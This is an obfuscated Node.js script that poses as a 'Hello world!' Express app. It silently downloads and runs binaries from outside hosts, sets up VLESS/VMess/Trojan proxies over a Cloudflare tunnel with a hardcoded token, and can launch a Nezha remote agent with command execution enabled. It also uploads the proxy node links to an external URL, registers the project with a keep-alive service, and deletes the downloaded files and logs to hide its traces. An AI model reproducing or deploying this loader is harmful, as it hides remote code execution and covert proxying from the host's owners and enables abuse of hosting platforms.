const _0x3b7ecc=_0x55e4;(function(_0x26e8a3,_0x12b8d9){const _0x229457=_0x55e4,_0xa6b75c=_0x26e8a3();while(!![]){try{const _0x4890d7=-parseInt(_0x229457(0x21c))/0x1*(parseInt(_0x229457(0x27a))/0x2)+-parseInt(_0x229457(0x1d4))/0x3*(parseInt(_0x229457(0x204))/0x4)+parseInt(_0x229457(0x1d1))/0x5*(parseInt(_0x229457(0x271))/0x6)+-parseInt(_0x229457(0x23e))/0x7+-parseInt(_0x229457(0x226))/0x8+parseInt(_0x229457(0x1ed))/0x9*(-parseInt(_0x229457(0x27d))/0xa)+parseInt(_0x229457(0x231))/0xb;if(_0x4890d7===_0x12b8d9)break;else _0xa6b75c['push'](_0xa6b75c['shift']());}catch(_0x3aa5c1){_0xa6b75c['push'](_0xa6b75c['shift']());}}}(_0x33e1,0x73c9e));const express=require(_0x3b7ecc(0x289)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x3b7ecc(0x268)),exec=promisify(require(_0x3b7ecc(0x212))[_0x3b7ecc(0x28b)]),{execSync}=require(_0x3b7ecc(0x212)),UPLOAD_URL=process[_0x3b7ecc(0x28d)][_0x3b7ecc(0x27f)]||'',PROJECT_URL=process[_0x3b7ecc(0x28d)][_0x3b7ecc(0x265)]||'',AUTO_ACCESS=process[_0x3b7ecc(0x28d)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x3b7ecc(0x28d)][_0x3b7ecc(0x213)]||_0x3b7ecc(0x26e),SUB_PATH=process[_0x3b7ecc(0x28d)][_0x3b7ecc(0x1db)]||_0x3b7ecc(0x251),PORT=process[_0x3b7ecc(0x28d)][_0x3b7ecc(0x241)]||process[_0x3b7ecc(0x28d)][_0x3b7ecc(0x1f3)]||0xbb8,UUID=process[_0x3b7ecc(0x28d)]['UUID']||_0x3b7ecc(0x253),NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x3b7ecc(0x28d)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x3b7ecc(0x28d)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x3b7ecc(0x28d)][_0x3b7ecc(0x203)]||_0x3b7ecc(0x222),ARGO_AUTH=process['env']['ARGO_AUTH']||'eyJhIjoiNTAyODU3NmMxOTVhNTBlMGE0NGY5ZTM0YWNhZmQwM2UiLCJ0IjoiNzFmY2M0MWMtY2Q2MC00NjEyLWI2MTItYjY0YzZjN2E3ZTZjIiwicyI6IlpEVmlaV1ZrWVRjdFpUSTBOeTAwTURneExXRTNaamd0TkdJd1lXWmpOemhpWkRVdyJ9',ARGO_PORT=process[_0x3b7ecc(0x28d)][_0x3b7ecc(0x1e6)]||0x1f41,CFIP=process[_0x3b7ecc(0x28d)][_0x3b7ecc(0x23a)]||_0x3b7ecc(0x24a),CFPORT=process[_0x3b7ecc(0x28d)][_0x3b7ecc(0x1fe)]||0x1bb,NAME=process[_0x3b7ecc(0x28d)][_0x3b7ecc(0x228)]||_0x3b7ecc(0x1d7);!fs[_0x3b7ecc(0x27c)](FILE_PATH)?(fs[_0x3b7ecc(0x25f)](FILE_PATH),console[_0x3b7ecc(0x1da)](FILE_PATH+_0x3b7ecc(0x244))):console[_0x3b7ecc(0x1da)](FILE_PATH+_0x3b7ecc(0x284));function _0x55e4(_0x5d9aec,_0x11fb16){const _0x33e1f1=_0x33e1();return _0x55e4=function(_0x55e49d,_0x545cf2){_0x55e49d=_0x55e49d-0x1d1;let _0x7594ee=_0x33e1f1[_0x55e49d];return _0x7594ee;},_0x55e4(_0x5d9aec,_0x11fb16);}function generateRandomName(){const _0x3fc1f0=_0x3b7ecc,_0x8bfec7=_0x3fc1f0(0x21e);let _0x32f505='';for(let _0x5e6c0f=0x0;_0x5e6c0f<0x6;_0x5e6c0f++){_0x32f505+=_0x8bfec7['charAt'](Math['floor'](Math[_0x3fc1f0(0x200)]()*_0x8bfec7['length']));}return _0x32f505;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();function _0x33e1(){const _0x564cef=['236241WRZSXo','error','http\x20server\x20is\x20running\x20on\x20port:','tunnel.yml','match','writeFileSync','PORT','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','post','aarch64','stringify','2096','https://arm64.ssss.nyc.mn/bot','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Error\x20reading\x20boot.log:','https://amd64.ssss.nyc.mn/v1','\x22\x20>\x20/dev/null\x202>&1','CFPORT','\x20failed:\x20','random','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','\x0a\x20\x20\x0avmess://','ARGO_DOMAIN','14152tdwlhW','2053','2087','Hello\x20world!','\x0aclient_secret:\x20','del\x20/f\x20/q\x20','substring','data','Subscription\x20uploaded\x20successfully','/trojan-argo','true','then','status','test','child_process','FILE_PATH','block','/vmess-argo','&path=%2Fvless-argo%3Fed%3D2560#','length','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','\x0avless://','127.0.0.1','App\x20is\x20running','334534wSTTxC','pop','abcdefghijklmnopqrstuvwxyz','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','\x0a\x20\x20\x0atrojan://','railway.wans.netlib.re','push','send','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','2141760eXTAWl','web\x20running\x20error:\x20','NAME','2083','&fp=firefox&type=ws&host=','\x20is\x20running','/dev/null','http','readFileSync','catch','https+local://8.8.8.8/dns-query','24625634GSUWTB','vless','https://amd64.ssss.nyc.mn/bot','8443','\x0a\x20\x20credentials-file:\x20','443','ARGO_DOMAIN:','Nodes\x20uploaded\x20successfully','close','CFIP','map','Empowerment\x20failed\x20for\x20','fileUrl','2244676zxCiti','&path=%2Ftrojan-argo%3Fed%3D2560#','firefox','SERVER_PORT','text/plain;\x20charset=utf-8','pipe','\x20is\x20created','trojan','\x20-s\x20','vmess','from','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','cdns.doon.eu.org','https://arm64.ssss.nyc.mn/web','fileName','readdirSync','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','?encryption=none&security=tls&sni=','sub','list.txt','59531c29-ba6a-4251-b055-9e1da4611e3c','Download\x20','Content-Type','\x20>\x20nul\x202>&1','listen','xtls-rprx-vision','clear','Empowerment\x20success\x20for\x20','Error\x20downloading\x20files:','chmod','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','automatic\x20access\x20task\x20added\x20successfully','mkdirSync','basename','base64','amd','message','split','PROJECT_URL','\x20-p\x20','/api/delete-nodes','util','quic','Error\x20executing\x20command:\x20','\x0a\x20\x20tunnel:\x20','filter','https://amd64.ssss.nyc.mn/agent','./zuofeng','nohup\x20','join','338874QwIPEF','win32','includes','/vless-argo','/api/add-nodes','https://amd64.ssss.nyc.mn/web','--tls','tls','unshift','4JrLeRB','/tunnel.yml\x20run','existsSync','190bStqqK','forEach','UPLOAD_URL','application/json','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','get','none','\x20already\x20exists','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','\x20>/dev/null\x202>&1\x20&','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','false','express','utf-8','exec','.exe\x20>\x20nul\x202>&1','env','45iOIaLP','unlinkSync','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','438PFgILP','https://arm64.ssss.nyc.mn/v1','config.json','railway','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','tunnel.json','log','SUB_PATH','/vmess-argo?ed=2560','\x0a\x20\x20\x20\x20','taskkill\x20/f\x20/im\x20','arm','toString','\x20-c\x20\x22','isFile','arm64','has','response','ARGO_PORT','\x20successfully','?security=tls&sni=','ArgoDomain:','https://arm64.ssss.nyc.mn/agent','tcp','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'];_0x33e1=function(){return _0x564cef;};return _0x33e1();}let npmPath=path[_0x3b7ecc(0x270)](FILE_PATH,npmName),phpPath=path[_0x3b7ecc(0x270)](FILE_PATH,phpName),webPath=path[_0x3b7ecc(0x270)](FILE_PATH,webName),botPath=path[_0x3b7ecc(0x270)](FILE_PATH,botName),subPath=path[_0x3b7ecc(0x270)](FILE_PATH,'sub.txt'),listPath=path['join'](FILE_PATH,_0x3b7ecc(0x252)),bootLogPath=path[_0x3b7ecc(0x270)](FILE_PATH,'boot.log'),configPath=path[_0x3b7ecc(0x270)](FILE_PATH,_0x3b7ecc(0x1d6));function deleteNodes(){const _0x3610bb=_0x3b7ecc;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x51330d;try{_0x51330d=fs[_0x3610bb(0x22e)](subPath,'utf-8');}catch{return null;}const _0x47ed21=Buffer['from'](_0x51330d,_0x3610bb(0x261))['toString']('utf-8'),_0x4a7a75=_0x47ed21[_0x3610bb(0x264)]('\x0a')[_0x3610bb(0x26c)](_0x187c9a=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3610bb(0x211)](_0x187c9a));if(_0x4a7a75['length']===0x0)return;return axios[_0x3610bb(0x1f5)](UPLOAD_URL+_0x3610bb(0x267),JSON[_0x3610bb(0x1f7)]({'nodes':_0x4a7a75}),{'headers':{'Content-Type':'application/json'}})['catch'](_0x407120=>{return null;}),null;}catch(_0x4b1222){return null;}}function cleanupOldFiles(){const _0x37ee40=_0x3b7ecc;try{const _0x2011a6=fs[_0x37ee40(0x24d)](FILE_PATH);_0x2011a6['forEach'](_0x50db4e=>{const _0xb19058=_0x37ee40,_0x1ac194=path[_0xb19058(0x270)](FILE_PATH,_0x50db4e);try{const _0x576cda=fs['statSync'](_0x1ac194);_0x576cda[_0xb19058(0x1e2)]()&&fs['unlinkSync'](_0x1ac194);}catch(_0x5568de){}});}catch(_0x47a6c0){}}app[_0x3b7ecc(0x282)]('/',function(_0x92d595,_0x3ee8c4){const _0xc48434=_0x3b7ecc;_0x3ee8c4[_0xc48434(0x224)](_0xc48434(0x207));});async function generateConfig(){const _0x265d6f=_0x3b7ecc,_0x55199a={'log':{'access':_0x265d6f(0x22c),'error':_0x265d6f(0x22c),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x265d6f(0x232),'settings':{'clients':[{'id':UUID,'flow':_0x265d6f(0x258)}],'decryption':_0x265d6f(0x283),'fallbacks':[{'dest':0xbb9},{'path':_0x265d6f(0x274),'dest':0xbba},{'path':_0x265d6f(0x215),'dest':0xbbb},{'path':_0x265d6f(0x20d),'dest':0xbbc}]},'streamSettings':{'network':_0x265d6f(0x1eb)}},{'port':0xbb9,'listen':_0x265d6f(0x21a),'protocol':_0x265d6f(0x232),'settings':{'clients':[{'id':UUID}],'decryption':_0x265d6f(0x283)},'streamSettings':{'network':_0x265d6f(0x1eb),'security':_0x265d6f(0x283)}},{'port':0xbba,'listen':_0x265d6f(0x21a),'protocol':_0x265d6f(0x232),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x265d6f(0x283)},'streamSettings':{'network':'ws','security':_0x265d6f(0x283),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x265d6f(0x22d),_0x265d6f(0x278),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x265d6f(0x21a),'protocol':_0x265d6f(0x247),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x265d6f(0x215)}},'sniffing':{'enabled':!![],'destOverride':[_0x265d6f(0x22d),'tls',_0x265d6f(0x269)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x265d6f(0x21a),'protocol':_0x265d6f(0x245),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x265d6f(0x20d)}},'sniffing':{'enabled':!![],'destOverride':[_0x265d6f(0x22d),_0x265d6f(0x278),_0x265d6f(0x269)],'metadataOnly':![]}}],'dns':{'servers':[_0x265d6f(0x230)]},'outbounds':[{'protocol':'freedom','tag':'direct'},{'protocol':'blackhole','tag':_0x265d6f(0x214)}]};fs['writeFileSync'](path['join'](FILE_PATH,_0x265d6f(0x1d6)),JSON['stringify'](_0x55199a,null,0x2));}function getSystemArchitecture(){const _0xa74489=_0x3b7ecc,_0x53dbf4=os['arch']();return _0x53dbf4==='arm'||_0x53dbf4===_0xa74489(0x1e3)||_0x53dbf4===_0xa74489(0x1f6)?'arm':_0xa74489(0x262);}function downloadFile(_0x57dda3,_0x4f8fc3,_0x35c0f9){const _0x163acf=_0x3b7ecc,_0x2365a7=_0x57dda3;!fs[_0x163acf(0x27c)](FILE_PATH)&&fs[_0x163acf(0x25f)](FILE_PATH,{'recursive':!![]});const _0x4f1643=fs['createWriteStream'](_0x2365a7);axios({'method':'get','url':_0x4f8fc3,'responseType':'stream'})[_0x163acf(0x20f)](_0x42d1c5=>{const _0x267b61=_0x163acf;_0x42d1c5[_0x267b61(0x20b)][_0x267b61(0x243)](_0x4f1643),_0x4f1643['on']('finish',()=>{const _0x338e34=_0x267b61;_0x4f1643[_0x338e34(0x239)](),console[_0x338e34(0x1da)]('Download\x20'+path[_0x338e34(0x260)](_0x2365a7)+_0x338e34(0x1e7)),_0x35c0f9(null,_0x2365a7);}),_0x4f1643['on']('error',_0x427b91=>{const _0x139124=_0x267b61;fs['unlink'](_0x2365a7,()=>{});const _0x442fc2='Download\x20'+path[_0x139124(0x260)](_0x2365a7)+_0x139124(0x1ff)+_0x427b91[_0x139124(0x263)];console['error'](_0x442fc2),_0x35c0f9(_0x442fc2);});})[_0x163acf(0x22f)](_0x42069f=>{const _0x2d78b8=_0x163acf,_0x18caad=_0x2d78b8(0x254)+path['basename'](_0x2365a7)+_0x2d78b8(0x1ff)+_0x42069f[_0x2d78b8(0x263)];console[_0x2d78b8(0x1ee)](_0x18caad),_0x35c0f9(_0x18caad);});}async function downloadFilesAndRun(){const _0x4b00dc=_0x3b7ecc,_0x5138a4=getSystemArchitecture(),_0x4ff2fd=getFilesForArchitecture(_0x5138a4);if(_0x4ff2fd['length']===0x0){console[_0x4b00dc(0x1da)](_0x4b00dc(0x24e));return;}const _0x523609=_0x4ff2fd[_0x4b00dc(0x23b)](_0x2ecda4=>{return new Promise((_0x4b100b,_0x3c7f69)=>{const _0xabeff9=_0x55e4;downloadFile(_0x2ecda4[_0xabeff9(0x24c)],_0x2ecda4[_0xabeff9(0x23d)],(_0x417b7a,_0x351a7b)=>{_0x417b7a?_0x3c7f69(_0x417b7a):_0x4b100b(_0x351a7b);});});});try{await Promise['all'](_0x523609);}catch(_0x4f28b0){console[_0x4b00dc(0x1ee)](_0x4b00dc(0x25b),_0x4f28b0);return;}function _0x41bee2(_0xd5ed9b){const _0x1620c8=_0x4b00dc,_0x5224b8=0x1fd;_0xd5ed9b[_0x1620c8(0x27e)](_0x4e23fd=>{const _0x1f7d83=_0x1620c8;fs['existsSync'](_0x4e23fd)&&fs[_0x1f7d83(0x25c)](_0x4e23fd,_0x5224b8,_0x3346d3=>{const _0x42ff17=_0x1f7d83;_0x3346d3?console[_0x42ff17(0x1ee)](_0x42ff17(0x23c)+_0x4e23fd+':\x20'+_0x3346d3):console[_0x42ff17(0x1da)](_0x42ff17(0x25a)+_0x4e23fd+':\x20'+_0x5224b8['toString'](0x8));});});}const _0x3ef118=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x41bee2(_0x3ef118);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2508cf=NEZHA_SERVER[_0x4b00dc(0x273)](':')?NEZHA_SERVER['split'](':')[_0x4b00dc(0x21d)]():'',_0x3a3845=new Set([_0x4b00dc(0x236),_0x4b00dc(0x234),_0x4b00dc(0x1f8),_0x4b00dc(0x206),_0x4b00dc(0x229),_0x4b00dc(0x205)]),_0x21d2e3=_0x3a3845[_0x4b00dc(0x1e4)](_0x2508cf)?_0x4b00dc(0x20e):_0x4b00dc(0x288),_0x147f8f=_0x4b00dc(0x208)+NEZHA_KEY+_0x4b00dc(0x25d)+NEZHA_SERVER+_0x4b00dc(0x249)+_0x21d2e3+_0x4b00dc(0x1fa)+UUID;fs[_0x4b00dc(0x1f2)](path['join'](FILE_PATH,'config.yaml'),_0x147f8f);const _0x3f39c2=_0x4b00dc(0x26f)+phpPath+_0x4b00dc(0x1e1)+FILE_PATH+_0x4b00dc(0x24f);try{await exec(_0x3f39c2),console['log'](phpName+'\x20is\x20running'),await new Promise(_0x2d73cc=>setTimeout(_0x2d73cc,0x3e8));}catch(_0x3ce4d9){console[_0x4b00dc(0x1ee)]('php\x20running\x20error:\x20'+_0x3ce4d9);}}else{let _0x2b53e2='';const _0x35d426=[_0x4b00dc(0x236),'8443',_0x4b00dc(0x1f8),_0x4b00dc(0x206),_0x4b00dc(0x229),_0x4b00dc(0x205)];_0x35d426[_0x4b00dc(0x273)](NEZHA_PORT)&&(_0x2b53e2=_0x4b00dc(0x277));const _0x39f734=_0x4b00dc(0x26f)+npmPath+_0x4b00dc(0x246)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4b00dc(0x266)+NEZHA_KEY+'\x20'+_0x2b53e2+_0x4b00dc(0x218);try{await exec(_0x39f734),console[_0x4b00dc(0x1da)](npmName+_0x4b00dc(0x22b)),await new Promise(_0x1cbafb=>setTimeout(_0x1cbafb,0x3e8));}catch(_0x553ae9){console['error']('npm\x20running\x20error:\x20'+_0x553ae9);}}}else console[_0x4b00dc(0x1da)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x41c0a2=_0x4b00dc(0x26f)+webPath+'\x20-c\x20'+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x41c0a2),console['log'](webName+_0x4b00dc(0x22b)),await new Promise(_0x13fa6a=>setTimeout(_0x13fa6a,0x3e8));}catch(_0x17bde5){console['error'](_0x4b00dc(0x227)+_0x17bde5);}if(fs['existsSync'](botPath)){let _0x4f9e56;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x4f9e56='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x4b00dc(0x1f1)](/TunnelSecret/)?_0x4f9e56=_0x4b00dc(0x220)+FILE_PATH+_0x4b00dc(0x27b):_0x4f9e56=_0x4b00dc(0x287)+FILE_PATH+_0x4b00dc(0x1d3)+ARGO_PORT;try{await exec(_0x4b00dc(0x26f)+botPath+'\x20'+_0x4f9e56+_0x4b00dc(0x286)),console['log'](botName+_0x4b00dc(0x22b)),await new Promise(_0x4f50fb=>setTimeout(_0x4f50fb,0x7d0));}catch(_0x34d17a){console['error'](_0x4b00dc(0x26a)+_0x34d17a);}}await new Promise(_0x2b1911=>setTimeout(_0x2b1911,0x1388));}function getFilesForArchitecture(_0x471e3f){const _0x2733b0=_0x3b7ecc;let _0x169c2f;_0x471e3f===_0x2733b0(0x1df)?_0x169c2f=[{'fileName':webPath,'fileUrl':_0x2733b0(0x24b)},{'fileName':botPath,'fileUrl':_0x2733b0(0x1f9)}]:_0x169c2f=[{'fileName':webPath,'fileUrl':_0x2733b0(0x276)},{'fileName':botPath,'fileUrl':_0x2733b0(0x233)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x32161a=_0x471e3f===_0x2733b0(0x1df)?_0x2733b0(0x1ea):_0x2733b0(0x26d);_0x169c2f[_0x2733b0(0x279)]({'fileName':npmPath,'fileUrl':_0x32161a});}else{const _0x29bd88=_0x471e3f===_0x2733b0(0x1df)?_0x2733b0(0x1d5):_0x2733b0(0x1fc);_0x169c2f[_0x2733b0(0x279)]({'fileName':phpPath,'fileUrl':_0x29bd88});}}return _0x169c2f;}function argoType(){const _0x497980=_0x3b7ecc;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x497980(0x1da)](_0x497980(0x201));return;}if(ARGO_AUTH[_0x497980(0x273)]('TunnelSecret')){fs['writeFileSync'](path[_0x497980(0x270)](FILE_PATH,_0x497980(0x1d9)),ARGO_AUTH);const _0x343868=_0x497980(0x26b)+ARGO_AUTH[_0x497980(0x264)]('\x22')[0xb]+_0x497980(0x235)+path[_0x497980(0x270)](FILE_PATH,_0x497980(0x1d9))+_0x497980(0x1f4)+ARGO_DOMAIN+_0x497980(0x1ec)+ARGO_PORT+_0x497980(0x281);fs[_0x497980(0x1f2)](path['join'](FILE_PATH,_0x497980(0x1f0)),_0x343868);}else console[_0x497980(0x1da)](_0x497980(0x1d8));}argoType();async function extractDomains(){const _0x53c303=_0x3b7ecc;let _0x41b9c5;if(ARGO_AUTH&&ARGO_DOMAIN)_0x41b9c5=ARGO_DOMAIN,console[_0x53c303(0x1da)](_0x53c303(0x237),_0x41b9c5),await _0x5c5108(_0x41b9c5);else try{const _0x3adacb=fs['readFileSync'](path[_0x53c303(0x270)](FILE_PATH,'boot.log'),'utf-8'),_0x307766=_0x3adacb['split']('\x0a'),_0xef50d2=[];_0x307766[_0x53c303(0x27e)](_0x139bcd=>{const _0x3dd4f1=_0x53c303,_0x55a444=_0x139bcd[_0x3dd4f1(0x1f1)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x55a444){const _0x590ba0=_0x55a444[0x1];_0xef50d2[_0x3dd4f1(0x223)](_0x590ba0);}});if(_0xef50d2[_0x53c303(0x217)]>0x0)_0x41b9c5=_0xef50d2[0x0],console['log'](_0x53c303(0x1e9),_0x41b9c5),await _0x5c5108(_0x41b9c5);else{console[_0x53c303(0x1da)](_0x53c303(0x285)),fs[_0x53c303(0x1d2)](path[_0x53c303(0x270)](FILE_PATH,'boot.log'));async function _0x3bf67f(){const _0x5192e0=_0x53c303;try{process['platform']==='win32'?await exec(_0x5192e0(0x1de)+botName+_0x5192e0(0x28c)):await exec('pkill\x20-f\x20\x22['+botName['charAt'](0x0)+']'+botName[_0x5192e0(0x20a)](0x1)+_0x5192e0(0x1fd));}catch(_0x262885){}}_0x3bf67f(),await new Promise(_0x14a3c7=>setTimeout(_0x14a3c7,0xbb8));const _0x333e73='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x53c303(0x1d3)+ARGO_PORT;try{await exec(_0x53c303(0x26f)+botPath+'\x20'+_0x333e73+_0x53c303(0x286)),console[_0x53c303(0x1da)](botName+_0x53c303(0x22b)),await new Promise(_0x14832b=>setTimeout(_0x14832b,0xbb8)),await extractDomains();}catch(_0x299078){console[_0x53c303(0x1ee)](_0x53c303(0x26a)+_0x299078);}}}catch(_0xf0b56){console['error'](_0x53c303(0x1fb),_0xf0b56);}async function _0x5c5108(_0x15b510){const _0x1aab93=_0x53c303,_0x3c6782=execSync(_0x1aab93(0x225),{'encoding':_0x1aab93(0x28a)}),_0x55183d=_0x3c6782['trim'](),_0x47f275=NAME?NAME+'-'+_0x55183d:_0x55183d;return new Promise(_0x3622d8=>{setTimeout(()=>{const _0x35eda0=_0x55e4,_0x472b0b={'v':'2','ps':''+_0x47f275,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':'none','host':_0x15b510,'path':_0x35eda0(0x1dc),'tls':_0x35eda0(0x278),'sni':_0x15b510,'alpn':'','fp':_0x35eda0(0x240)},_0x22f4da=_0x35eda0(0x219)+UUID+'@'+CFIP+':'+CFPORT+_0x35eda0(0x250)+_0x15b510+_0x35eda0(0x22a)+_0x15b510+_0x35eda0(0x216)+_0x47f275+_0x35eda0(0x202)+Buffer[_0x35eda0(0x248)](JSON[_0x35eda0(0x1f7)](_0x472b0b))['toString'](_0x35eda0(0x261))+_0x35eda0(0x221)+UUID+'@'+CFIP+':'+CFPORT+_0x35eda0(0x1e8)+_0x15b510+_0x35eda0(0x22a)+_0x15b510+_0x35eda0(0x23f)+_0x47f275+_0x35eda0(0x1dd);console[_0x35eda0(0x1da)](Buffer[_0x35eda0(0x248)](_0x22f4da)[_0x35eda0(0x1e0)]('base64')),fs[_0x35eda0(0x1f2)](subPath,Buffer['from'](_0x22f4da)['toString'](_0x35eda0(0x261))),console[_0x35eda0(0x1da)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x35eda0(0x282)]('/'+SUB_PATH,(_0x1da642,_0x50fe2d)=>{const _0x2c3073=_0x35eda0,_0x126566=Buffer[_0x2c3073(0x248)](_0x22f4da)[_0x2c3073(0x1e0)]('base64');_0x50fe2d['set'](_0x2c3073(0x255),_0x2c3073(0x242)),_0x50fe2d[_0x2c3073(0x224)](_0x126566);}),_0x3622d8(_0x22f4da);},0x7d0);});}}async function uploadNodes(){const _0x4a7982=_0x3b7ecc;if(UPLOAD_URL&&PROJECT_URL){const _0x2cf2e7=PROJECT_URL+'/'+SUB_PATH,_0xd2baf0={'subscription':[_0x2cf2e7]};try{const _0x57d8f9=await axios[_0x4a7982(0x1f5)](UPLOAD_URL+'/api/add-subscriptions',_0xd2baf0,{'headers':{'Content-Type':'application/json'}});return _0x57d8f9&&_0x57d8f9[_0x4a7982(0x210)]===0xc8?(console['log'](_0x4a7982(0x20c)),_0x57d8f9):null;}catch(_0x379ae7){if(_0x379ae7['response']){if(_0x379ae7[_0x4a7982(0x1e5)][_0x4a7982(0x210)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x4a7982(0x27c)](listPath))return;const _0x5d90a5=fs['readFileSync'](listPath,_0x4a7982(0x28a)),_0x3bfc8d=_0x5d90a5[_0x4a7982(0x264)]('\x0a')['filter'](_0x300984=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4a7982(0x211)](_0x300984));if(_0x3bfc8d[_0x4a7982(0x217)]===0x0)return;const _0x5b0e3f=JSON[_0x4a7982(0x1f7)]({'nodes':_0x3bfc8d});try{const _0x18b067=await axios['post'](UPLOAD_URL+_0x4a7982(0x275),_0x5b0e3f,{'headers':{'Content-Type':_0x4a7982(0x280)}});return _0x18b067&&_0x18b067[_0x4a7982(0x210)]===0xc8?(console[_0x4a7982(0x1da)](_0x4a7982(0x238)),_0x18b067):null;}catch(_0x30a120){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x1108a2=_0x55e4,_0x107ea9=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x107ea9['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x107ea9[_0x1108a2(0x223)](phpPath);process['platform']===_0x1108a2(0x272)?exec(_0x1108a2(0x209)+_0x107ea9[_0x1108a2(0x270)]('\x20')+_0x1108a2(0x256),_0x583a3b=>{const _0x327cda=_0x1108a2;console[_0x327cda(0x259)](),console[_0x327cda(0x1da)](_0x327cda(0x21b)),console['log'](_0x327cda(0x21f));}):exec('rm\x20-rf\x20'+_0x107ea9[_0x1108a2(0x270)]('\x20')+'\x20>/dev/null\x202>&1',_0x57b130=>{const _0x4eb687=_0x1108a2;console[_0x4eb687(0x259)](),console[_0x4eb687(0x1da)](_0x4eb687(0x21b)),console[_0x4eb687(0x1da)](_0x4eb687(0x21f));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x473bc6=_0x3b7ecc;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x473bc6(0x1da)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x1c5885=await axios[_0x473bc6(0x1f5)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x473bc6(0x280)}});return console[_0x473bc6(0x1da)](_0x473bc6(0x25e)),_0x1c5885;}catch(_0x479841){return console[_0x473bc6(0x1ee)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x479841[_0x473bc6(0x263)]),null;}}async function startserver(){const _0x307927=_0x3b7ecc;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x143746){console[_0x307927(0x1ee)]('Error\x20in\x20startserver:',_0x143746);}}startserver()[_0x3b7ecc(0x22f)](_0xa19de7=>{const _0x2d7ff3=_0x3b7ecc;console[_0x2d7ff3(0x1ee)]('Unhandled\x20error\x20in\x20startserver:',_0xa19de7);}),app[_0x3b7ecc(0x257)](PORT,()=>console[_0x3b7ecc(0x1da)](_0x3b7ecc(0x1ef)+PORT+'!'));
